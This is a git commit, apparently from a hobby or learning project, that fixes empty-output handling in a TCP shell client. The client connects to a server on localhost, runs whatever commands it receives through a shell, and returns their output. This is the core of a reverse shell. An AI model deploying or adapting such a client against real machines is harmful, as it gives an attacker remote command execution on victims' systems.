e232793fc5d459e6af759bf6011c56c169e6c3f6
Dario Ljubas <darioljubas33@gmail.com>
2023-12-15 20:12:22 +0100

    Fixed no-output problem
    If a command returned no output, the client would send an empty string to the server which caused problems.

--- tcp-shell/client.py
+++ tcp-shell/client.py
@@ -7,5 +7,10 @@ s.connect(('127.0.0.1', 8080))
 while True:
     command = s.recv(1024).decode()
     CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    s.send( CMD.stdout.read() )
+    output = CMD.stdout.read()
+
+    if output != b"":
+        s.send( output )
+    else:
+        s.send( "__no_output".encode() )
     s.send( CMD.stderr.read() )
